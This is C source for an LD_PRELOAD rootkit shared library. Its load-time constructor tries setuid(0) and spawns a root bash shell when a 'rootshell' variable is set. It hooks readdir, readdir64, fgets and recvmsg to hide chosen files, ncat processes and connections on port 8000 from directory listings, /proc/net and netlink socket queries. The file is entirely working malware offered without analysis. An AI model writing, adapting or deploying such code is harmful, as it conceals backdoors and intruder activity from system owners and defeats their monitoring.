#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include <linux/sock_diag.h>
#include <arpa/inet.h>

/* --- Configuration --- */
#define NAME_TO_HIDE "ncat"
#define PORT_TO_HIDE_HEX "1F90" 
#define TARGET_PORT 8000        
#define HIDE_LIST "secret_dir,libhide.so.2,ld.so.preload.dummy"

/* --- 1. Constructor (Root Shell Logic) --- */
// This runs automatically when the shared library is loaded
void __attribute__((constructor)) init() {
    if (getenv("rootshell")) {
        // Clear environment to prevent recursion and detection
        unsetenv("rootshell");
        unsetenv("LD_PRELOAD");

        // Attempt to escalate privileges
        setuid(0);
        setgid(0);
        
        // Replace current process with a root bash shell
        execl("/bin/bash", "bash", NULL);
    }
}

/* --- 2. Helper Logic --- */

static int should_hide_file(const char *name) {
    if (!name) return 0;
    char list[] = HIDE_LIST;
    char *token = strtok(list, " ,");
    while (token != NULL) {
        if (strcmp(name, token) == 0) return 1;
        token = strtok(NULL, " ,");
    }
    return 0;
}

static int is_target_pid(const char *name) {
    if (!name || name[0] < '0' || name[0] > '9') return 0;
    char path[64], buf[64];
    snprintf(path, sizeof(path), "/proc/%s/comm", name);
    static FILE* (*orig_fopen)(const char*, const char*) = NULL;
    if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, "fopen");
    FILE *f = orig_fopen(path, "r");
    if (!f) return 0;
    int found = (fgets(buf, sizeof(buf), f) && strstr(buf, NAME_TO_HIDE));
    fclose(f);
    return found;
}

static int is_target_msg(struct nlmsghdr *nlh) {
    if (nlh->nlmsg_type != SOCK_DIAG_BY_FAMILY && nlh->nlmsg_type != 18) return 0;
    if (nlh->nlmsg_len < NLMSG_LENGTH(sizeof(struct inet_diag_msg))) return 0;
    struct inet_diag_msg *msg = NLMSG_DATA(nlh);
    if (ntohs(msg->id.idiag_sport) == TARGET_PORT || ntohs(msg->id.idiag_dport) == TARGET_PORT) return 1;
    return 0;
}

/* --- 3. Function Hooks --- */

struct dirent *readdir(DIR *dirp) {
    static struct dirent* (*orig)(DIR*) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = orig(dirp))) {
        if (should_hide_file(e->d_name)) continue; 
        if (is_target_pid(e->d_name)) continue;    
        return e;
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    static struct dirent64* (*orig)(DIR*) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *e;
    while ((e = orig(dirp))) {
        if (should_hide_file(e->d_name)) continue; 
        if (is_target_pid(e->d_name)) continue;    
        return e;
    }
    return NULL;
}

char *fgets(char *s, int size, FILE *stream) {
    static char* (*orig)(char*, int, FILE*) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "fgets");
    char *ret = orig(s, size, stream);
    if (ret && strstr(s, ":" PORT_TO_HIDE_HEX " ")) return fgets(s, size, stream); 
    return ret;
}

ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags) {
    static ssize_t (*orig_recvmsg)(int, struct msghdr*, int) = NULL;
    if (!orig_recvmsg) orig_recvmsg = dlsym(RTLD_NEXT, "recvmsg");
    ssize_t ret = orig_recvmsg(sockfd, msg, flags);
    if (ret <= 0 || !msg->msg_iov || !msg->msg_iov->iov_base) return ret;
    struct nlmsghdr *nlh = (struct nlmsghdr *)msg->msg_iov->iov_base;
    int remaining = (int)ret;
    while (NLMSG_OK(nlh, remaining)) {
        if (nlh->nlmsg_type == NLMSG_DONE) break;
        if (is_target_msg(nlh)) {
            size_t msg_len = NLMSG_ALIGN(nlh->nlmsg_len);
            char *next_msg = (char *)nlh + msg_len;
            int bytes_after = remaining - msg_len;
            if (bytes_after > 0) memmove(nlh, next_msg, bytes_after);
            ret -= msg_len;
            remaining -= msg_len;
            continue; 
        }
        nlh = NLMSG_NEXT(nlh, remaining);
    }
    return ret;
}

